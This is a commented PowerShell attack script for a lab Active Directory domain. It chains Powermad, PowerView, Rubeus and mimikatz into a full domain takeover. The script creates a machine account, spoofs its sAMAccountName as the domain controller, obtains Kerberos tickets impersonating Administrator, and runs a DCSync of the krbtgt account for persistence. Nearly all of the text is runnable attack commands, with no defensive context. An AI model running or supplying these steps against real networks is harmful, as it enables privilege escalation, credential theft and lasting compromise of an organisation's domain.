klist purge
. "$($env:USERPROFILE)\Downloads\Powermad-master\Powermad.ps1"
. "$($env:USERPROFILE)\Downloads\PowerView.ps1"

#region Use a unpriv user to start this attack. If you are already on a domain joined machine you won't need to this and have to remove the $Creds variable from later commands
$Password = ConvertTo-SecureString 'Pa$$word' -AsPlainText -Force
[pscredential]$Creds = New-Object System.Management.Automation.PSCredential ("DOMAIN\USERNAME", $password)
cls
#endregion

#region create a computer account
Write-Output "Create a new Computer Account"
$password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
New-MachineAccount -MachineAccount "ControlledComputer" -Password $password -Domain "cve.lab" -DomainController "DC01.cve.lab" -Credential $Creds  -Verbose
#endregion

#region Remove ServicePrincipalName attribute
Write-Output "Clear SPN from Computer Account object"
Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=CVE,DC=LAB" -Clear 'serviceprincipalname' -Server dc01.cve.lab -Credential $Creds -Domain cve.lab -Verbose
#endregion

#region Change SamAccountName
Write-Output "Rename SamAccountName to DC01"
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DC01" -Attribute samaccountname -Credential $Creds -Domain cve.lab -DomainController dc01.cve.lab -Verbose
#endregion

#region Obtain a TGT
Write-Output "Obtain TGT from DC01 using password from created computer object"
. "$($env:USERPROFILE)\Downloads\Rubeus-pac\Rubeus\bin\Debug\Rubeus.exe" asktgt /user:"DC01" /password:"ComputerPassword" /domain:"cve.lab" /dc:"DC01.cve.lab" /outfile:kerberos.tgt.kirbi
#endregion

#region Change SamAccountName back
Write-Output "Rename SamAccountName back to DControlledComputer`$"
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer$" -Attribute samaccountname -Credential $Creds -Domain cve.lab -DomainController dc01.cve.lab -Verbose
#endregion

#region Obtain TGS for CIFS access
Write-Output "Get TGS for CIFS/DC01"
. "$($env:USERPROFILE)\Downloads\Rubeus-pac\Rubeus\bin\Debug\Rubeus.exe" s4u /self /impersonateuser:"Administrator" /altservice:"cifs/DC01.cve.lab" /dc:"DC01.cve.lab" /ptt /ticket:kerberos.tgt.kirbi
#endregion

#region Verify access
Write-Output "Check file access to DC01"
Get-Childitem \\DC01.cve.lab\c$
#endregion

#region DCSync krbtgt for persistence
Write-Output "Get TGS for LDAP/DC01"
. "$($env:USERPROFILE)\Downloads\Rubeus-pac\Rubeus\bin\Debug\Rubeus.exe" s4u /self /impersonateuser:"Administrator" /altservice:"ldap/DC01.cve.lab" /dc:"DC01.cve.lab" /ptt /ticket:kerberos.tgt.kirbi
Write-Output "Use mimikatz to do a dcsync for account krbtgt to establish persistence"
. "$($env:USERPROFILE)\Downloads\mimikatz_trunk\x64\mimikatz.exe" "kerberos::list" "lsadump::dcsync /domain:cve.lab /kdc:DC01.cve.lab /user:krbtgt" exit
#endregion

